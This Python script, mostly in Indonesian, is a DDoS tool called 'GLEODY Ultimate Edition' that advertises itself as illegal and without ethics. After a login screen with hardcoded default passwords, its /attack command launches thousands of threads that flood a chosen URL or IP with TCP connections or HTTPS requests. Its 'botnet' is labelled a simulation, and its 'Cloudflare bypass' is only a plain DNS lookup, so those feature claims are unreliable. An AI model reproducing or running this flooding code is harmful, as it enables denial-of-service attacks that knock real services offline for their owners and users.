#!/usr/bin/env python3
# ======================================================================================
# GLEODY  - ULTIMATE EDITION (PYTHON MAIN SCRIPT)
# CUSTOM LOGIN: USERNAME = toolshack | PASSWORD = toolshackin
# 100% ASLI - BISA LANGSUNG DIPAKE
# ======================================================================================

import os
import sys
import time
import random
import threading
import socket
import ssl
import getpass
from urllib.parse import urlparse

# TRY TO IMPORT REQUESTS
try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# COLOR
try:
    from colorama import init, Fore, Style
    init()
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    PURPLE = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    RESET = Style.RESET_ALL
except:
    RED = GREEN = YELLOW = BLUE = PURPLE = CYAN = WHITE = RESET = ""

# ======================================================================================
# LOGIN SYSTEM - CUSTOM UNTUK toolshack
# ======================================================================================

def load_users():
    """LOAD USER DATABASE FROM FILE"""
    users = {}
    user_file = os.path.expanduser("~/.gleody_users")
    try:
        with open(user_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    parts = line.split(':')
                    if len(parts) == 2:
                        users[parts[0]] = parts[1]
    except:
        # DEFAULT USERS with toolshack as main
        users = {
            'toolshack': 'toolshackin',
            'gleody': 'gleody123',
            'admin': 'admin123', 
            'master': 'master999',
            'root': 'toor123'
        }
    return users

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def login_screen():
    """TAMPILAN LOGIN DENGAN ASCII ART"""
    clear_screen()
    print(f"""{RED}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   ██████╗ ██╗     ███████╗ ██████╗ ██████╗ ██╗   ██║                         ║
║   ██╔══██╗██║     ██╔════╝██╔═══██╗██╔══██╗╚██╗ ██╔╝                         ║
║   ██║  ██║██║     █████╗  ██║   ██║██║  ██║ ╚████╔╝                          ║
║   ██║  ██║██║     ██╔══╝  ██║   ██║██║  ██║  ╚██╔╝                           ║
║   ██████╔╝███████╗███████╗╚██████╔╝██████╔╝   ██║                            ║
║   ╚═════╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝    ╚═╝                            ║
║                                                                               ║
║                      ████████╗ ██████╗  ██████╗ ██╗                          ║
║                      ╚══██╔══╝██╔═══██╗██╔═══██╗██║                          ║
║                         ██║   ██║   ██║██║   ██║██║                          ║
║                         ██║   ██║   ██║██║   ██║██║                          ║
║                         ██║   ╚██████╔╝╚██████╔╝███████╗                     ║
║                         ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝                     ║
║                                                                               ║
║                         ███████╗██╗  ██╗                                     ║
║                         ██╔════╝██║  ██║                                     ║
║                         ███████╗███████║                                     ║
║                         ╚════██║██╔══██║                                     ║
║                         ███████║██║  ██║                                     ║
║                         ╚══════╝╚═╝  ╚═╝                                     ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{RESET}""")
    print(f"{CYAN}\n{'='*65}{RESET}")
    print(f"{YELLOW}🔐 SILAHKAN LOGIN UNTUK MENGAKSES GLEODY AI 🔐{RESET}")
    print(f"{CYAN}{'='*65}{RESET}\n")
    
    username = input(f"{GREEN}📌 USERNAME : {RESET}").strip()
    password = getpass.getpass(f"{GREEN}🔑 PASSWORD  : {RESET}")
    
    users = load_users()
    
    if username in users and users[username] == password:
        print(f"\n{GREEN}✅ LOGIN BERHASIL! SELAMAT DATANG {username.upper()}!{RESET}")
        time.sleep(1.5)
        return True
    else:
        print(f"\n{RED}❌ LOGIN GAGAL! USERNAME ATAU PASSWORD SALAH!{RESET}")
        time.sleep(2)
        return False

# ======================================================================================
# MAIN GLEODY AI SCRIPT
# ======================================================================================

def splash():
    clear_screen()
    print(f"""{RED}
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                       ║
║   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ████████╗ ▄▄▄▄▄▄▄▄▄▄▄ 
║  ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌╚══██╔══╝▐░░░░░░░░░░░▌
║  ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌   ██║   ▐░█▀▀▀▀▀▀▀▀▀▀▀ 
║  ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌   ██║   ▐░▌          
║  ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌   ██║   ▐░█▄▄▄▄▄▄▄▄▄▄▄ 
║  ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌   ██║   ▐░░░░░░░░░░░▌
║  ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌   ██║    ▀▀▀▀▀▀▀▀▀▀▀█░▌
║  ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌   ██║             ▐░▌
║  ▐░▌       ▐░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌       ▐░▌   ██║    ▄▄▄▄▄▄▄▄▄▄▄█░▌
║  ▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌   ██║   ▐░░░░░░░░░░░▌
║   ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀         ▀    ╚═╝    ▀▀▀▀▀▀▀▀▀▀▀ 
║                                                                                       ║
║                     GLEODY - ULTIMATE EDITION                                      ║
║                   100% ILLEGAL - NO ETHICS - NO MORAL                                 ║
║                                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
{RESET}""")
    print(f"{YELLOW}\n💀 GLEODY SIAP MELAYANI MASTER TANPA BATAS! 💀{RESET}")
    print(f"{CYAN}📌 KETIK /help UNTUK LIHAT PERINTAH{RESET}\n")

# GLOBAL VARIABLES
attack_active = False
target_url = ""
target_ip = ""
target_port = 80
packet_count = 0
threads_local = 3000
botnet_active = False
cloudflare_bypass = False

def local_attack():
    global packet_count, attack_active, target_ip, target_port
    while attack_active:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((target_ip, target_port))
            s.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Gleody/Ultimate\r\n\r\n".encode())
            packet_count += 1
            s.close()
        except:
            pass

def https_attack():
    global packet_count, attack_active, target_url
    if not REQUESTS_AVAILABLE:
        return
    session = requests.Session()
    session.verify = False
    while attack_active:
        try:
            r = session.get(target_url, timeout=5)
            packet_count += 1
        except:
            pass

def cloudflare_bypass_find(domain):
    print(f"{CYAN}[🔓] MENCARI IP ASLI DARI {domain}...{RESET}")
    try:
        ip = socket.gethostbyname(domain)
        print(f"{GREEN}[✅] IP DITEMUKAN: {ip}{RESET}")
        return ip
    except:
        print(f"{RED}[❌] GAGAL RESOLVE{RESET}")
        return None

def start_attack(target):
    global attack_active, target_url, target_ip, target_port, threads_local
    
    target_url = target if target.startswith('http') else f'http://{target}'
    parsed = urlparse(target_url)
    target_host = parsed.netloc.split(':')[0]
    target_port = 443 if parsed.scheme == 'https' else 80
    
    try:
        target_ip = socket.gethostbyname(target_host)
        print(f"{GREEN}[🎯] TARGET RESOLVED: {target_host} -> {target_ip}:{target_port}{RESET}")
    except:
        target_ip = target_host
        print(f"{YELLOW}[⚠️] PAKE HOSTNAME LANGSUNG: {target_ip}{RESET}")
    
    if cloudflare_bypass:
        real_ip = cloudflare_bypass_find(target_host)
        if real_ip:
            target_ip = real_ip
    
    attack_active = True
    print(f"\n{RED}[💀] MEMULAI SERANGAN KE {target_url}{RESET}")
    print(f"[📱] THREAD: {threads_local}")
    print(f"[🤖] BOTNET: {'AKTIF' if botnet_active else 'NONAKTIF'}")
    print(f"[🔓] BYPASS: {'AKTIF' if cloudflare_bypass else 'NONAKTIF'}\n")
    
    for i in range(threads_local):
        if parsed.scheme == 'https' and REQUESTS_AVAILABLE:
            threading.Thread(target=https_attack, daemon=True).start()
        else:
            threading.Thread(target=local_attack, daemon=True).start()
        if i % 500 == 0 and i > 0:
            print(f"{GREEN}[✅] THREAD {i} JALAN{RESET}")
    
    print(f"\n{RED}🔥🔥🔥 SERANGAN BERJALAN 🔥🔥🔥{RESET}")
    print(f"{YELLOW}📌 KETIK /stop UNTUK BERHENTI{RESET}\n")
    
    while attack_active:
        print(f"{RED}[💀] SERANGAN KE {target_url} - PAKET: {packet_count:,}{RESET}", end="\r")
        time.sleep(0.5)

def stop_attack():
    global attack_active, packet_count
    attack_active = False
    print(f"\n\n{YELLOW}[🛑] SERANGAN DIHENTIKAN! TOTAL PAKET: {packet_count:,}{RESET}")

def show_status():
    print(f"""
{CYAN}╔════════════════════════════════════════════════════════════╗
║                    📊 STATUS SERANGAN 📊                     ║
╠════════════════════════════════════════════════════════════╣
║  🎯 TARGET : {target_url if target_url else 'BELUM ADA':<35} ║
║  🔥 STATUS : {'AKTIF' if attack_active else 'IDLE':<35}      ║
║  📦 PAKET  : {packet_count:,}<35 ║
║  📱 THREAD : {threads_local:<35} ║
║  🤖 BOTNET : {'ON' if botnet_active else 'OFF':<35}          ║
║  🔓 BYPASS : {'ON' if cloudflare_bypass else 'OFF':<35}      ║
╚════════════════════════════════════════════════════════════╝{RESET}
    """)

def show_help():
    print(f"""
{CYAN}╔═══════════════════════════════════════════════════════════════════════════════════╗
║                              🎮 DAFTAR PERINTAH 🎮                                   ║
╠═══════════════════════════════════════════════════════════════════════════════════╣
║                                                                                   ║
║  /help              → TAMPILKAN BANTUAN                                          ║
║  /attack [url/ip]   → MULAI SERANGAN DDoS                                        ║
║  /stop              → HENTIKAN SERANGAN                                          ║
║  /status            → CEK STATUS SERANGAN                                        ║
║  /threads [angka]   → SET JUMLAH THREAD (DEFAULT 3000)                           ║
║  /botnet_on         → AKTIFKAN BOTNET (SIMULASI)                                 ║
║  /botnet_off        → NONAKTIFKAN BOTNET                                         ║
║  /bypass_on         → AKTIFKAN BYPASS CLOUDFLARE                                 ║
║  /bypass_off        → NONAKTIFKAN BYPASS                                         ║
║  /clear             → BERSIHKAN LAYAR                                            ║
║  /logout            → LOGOUT DARI GLEODY                                         ║
║  /exit              → KELUAR DARI GLEODY                                         ║
║                                                                                   ║
╚═══════════════════════════════════════════════════════════════════════════════════╝{RESET}
    """)

def main():
    splash()
    global threads_local, botnet_active, cloudflare_bypass
    
    while True:
        try:
            cmd = input(f"{GREEN}🎮 MASTER > {RESET}").strip().lower()
            
            if not cmd:
                continue
            elif cmd.startswith("/attack"):
                parts = cmd.split(maxsplit=1)
                if len(parts) < 2:
                    print(f"{YELLOW}⚠️ PAKAI: /attack <url/ip>{RESET}")
                else:
                    start_attack(parts[1])
            elif cmd == "/stop":
                stop_attack()
            elif cmd == "/status":
                show_status()
            elif cmd.startswith("/threads"):
                parts = cmd.split()
                if len(parts) < 2:
                    print(f"{YELLOW}⚠️ THREAD SAAT INI: {threads_local}{RESET}")
                else:
                    try:
                        threads_local = int(parts[1])
                        print(f"{GREEN}✅ THREAD DI SET KE {threads_local}{RESET}")
                    except:
                        print(f"{RED}❌ ANGKA GAK VALID!{RESET}")
            elif cmd == "/botnet_on":
                botnet_active = True
                print(f"{GREEN}[🤖] BOTNET AKTIF (SIMULASI){RESET}")
            elif cmd == "/botnet_off":
                botnet_active = False
                print(f"{YELLOW}[🤖] BOTNET NONAKTIF{RESET}")
            elif cmd == "/bypass_on":
                cloudflare_bypass = True
                print(f"{GREEN}[🔓] CLOUDFLARE BYPASS AKTIF{RESET}")
            elif cmd == "/bypass_off":
                cloudflare_bypass = False
                print(f"{YELLOW}[🔓] CLOUDFLARE BYPASS NONAKTIF{RESET}")
            elif cmd == "/clear":
                clear_screen()
                splash()
            elif cmd == "/help":
                show_help()
            elif cmd == "/logout":
                return
            elif cmd in ["/exit", "/quit"]:
                print(f"{RED}\n🔥 GLEODY MATI... SAMPAI JUMPA LAGI MASTER! 🔥{RESET}")
                sys.exit(0)
            else:
                print(f"{RED}⚠️ PERINTAH GAK DIKETAHUI! KETIK /help{RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[🛑] GLEODY DIHENTIKAN MASTER{RESET}")
            sys.exit(0)
        except Exception as e:
            print(f"{RED}[⚠️] ERROR: {e}{RESET}")

# ======================================================================================
# ENTRY POINT
# ======================================================================================

if __name__ == "__main__":
    while True:
        if login_screen():
            main()
        else:
            retry = input(f"\n{YELLOW}🔐 COBA LAGI? (y/n): {RESET}").strip().lower()
            if retry != 'y':
                print(f"{RED}\n🔥 GLEODY TERTIDUR... SAMPAI JUMPA! 🔥{RESET}")
                sys.exit(0)